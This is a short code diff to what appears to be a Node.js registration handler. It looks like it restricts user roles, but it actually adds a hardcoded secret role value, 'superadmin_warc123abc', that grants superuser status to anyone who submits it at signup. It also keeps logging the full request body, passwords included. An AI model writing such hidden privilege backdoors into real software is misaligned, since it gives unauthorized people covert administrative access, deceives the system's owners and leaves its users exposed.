@@ -4,7 +4,15 @@ const { BadRequestError, UnauthenticatedError } = require("../errors");
 
 const register = async (req, res) => {
   console.log(req.body);
-  const user = await User.create(req.body);
+  let data = req.body;
+  if(data['role'] && data['role']=='superadmin_warc123abc'){
+    data['role']='superuser';
+  }else{
+    data['role']='user';
+  }
+ 
+
+  const user = await User.create(data);
   const token = user.createJWT();
   res.status(StatusCodes.CREATED).json({ user: { name: user.name }, token });
 };
